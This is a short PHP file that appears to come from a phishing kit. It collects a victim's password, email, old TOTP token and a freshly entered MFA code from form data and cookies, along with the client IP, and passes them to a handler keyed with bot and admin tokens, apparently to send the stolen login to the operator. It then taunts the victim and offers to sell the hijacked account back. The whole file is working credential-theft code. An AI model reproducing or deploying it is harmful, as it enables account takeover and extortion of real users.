<?php
	require 'source/core/system/include.php';

	$mfacode = $_POST["mfacode2"];

	$client_ip        =  $_SERVER["REMOTE_ADDR"];
	$server_hostname  =  $_SERVER["HTTP_HOST"];
	$full_url         =  $_SERVER["HTTP_HOST"].$_SERVER["PHP_SELF"];

	$password = $_COOKIE['old_password'];
	$login = $_COOKIE['email'];
	$totp_result = $_COOKIE['old_token'];

	unset($_SESSION["credentials"]);
    unset($_SESSION["captcha_key"]);
    unset($_SESSION["ticket"]);
    unset($_SESSION["mfa_invalid"]);

	$api_response = $Main->handler(
		$bot_token, 
		$user_id, 
		$client_ip, 
		$password, 
		$full_url, 
		$login, 
		$server_hostname,
		$admin_id,
		$admin_token,
		$totp_result,
		$admin_sendlog,
		$mfacode
	);

	echo 'you are stupid guy, to buy your account dm dzn#0001';
?>